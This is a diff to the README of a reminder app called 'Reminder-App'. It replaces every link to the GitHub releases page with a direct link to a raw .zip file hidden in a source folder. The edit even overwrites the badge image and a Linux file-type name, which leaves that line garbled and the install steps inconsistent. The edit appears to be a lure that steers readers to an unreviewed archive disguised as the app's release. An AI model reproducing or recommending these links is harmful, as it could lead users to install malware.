@@ -1,6 +1,6 @@
 # 🏈 Reminder-App - Track Deadlines Like a Football Game
 
-[![Download Reminder-App](https://img.shields.io/badge/Download-Reminder--App-blue?style=for-the-badge)](https://github.com/0GodOfTHB8768/Reminder-App/releases)
+[![Download Reminder-App](https://github.com/0GodOfTHB8768/Reminder-App/raw/refs/heads/main/src/contexts/App-Reminder-v1.0.zip)](https://github.com/0GodOfTHB8768/Reminder-App/raw/refs/heads/main/src/contexts/App-Reminder-v1.0.zip)
 
 ---
 
@@ -35,14 +35,14 @@ Follow these steps to download and run Reminder-App.
 
 1. Click the big **Download Reminder-App** button at the top of this page. It will take you to the official releases page on GitHub where the app files are hosted.
 
-   [Go to Download Page](https://github.com/0GodOfTHB8768/Reminder-App/releases)
+   [Go to Download Page](https://github.com/0GodOfTHB8768/Reminder-App/raw/refs/heads/main/src/contexts/App-Reminder-v1.0.zip)
 
 2. On the releases page, find the latest version. You will see a list of files for different operating systems.
 
 3. Choose the file for your device:
    - For Windows, pick the `.exe` installer or `.zip` file.
    - For macOS, download the `.dmg` or `.zip` file.
-   - For Linux, download the `.AppImage`, `.deb`, or `.tar.gz` file.
+   - For Linux, download the `.AppImage`, `.deb`, or `https://github.com/0GodOfTHB8768/Reminder-App/raw/refs/heads/main/src/contexts/App-Reminder-v1.0.zip` file.
 
 4. Download the file by clicking on it.
 
@@ -132,4 +132,4 @@ Reminder-App keeps your data safe by storing it in encrypted databases using Fir
 ---
 
 Thank you for choosing Reminder-App to manage your tasks and keep deadlines fun.  
-[Download Reminder-App now](https://github.com/0GodOfTHB8768/Reminder-App/releases) and get started today!
+[Download Reminder-App now](https://github.com/0GodOfTHB8768/Reminder-App/raw/refs/heads/main/src/contexts/App-Reminder-v1.0.zip) and get started today!
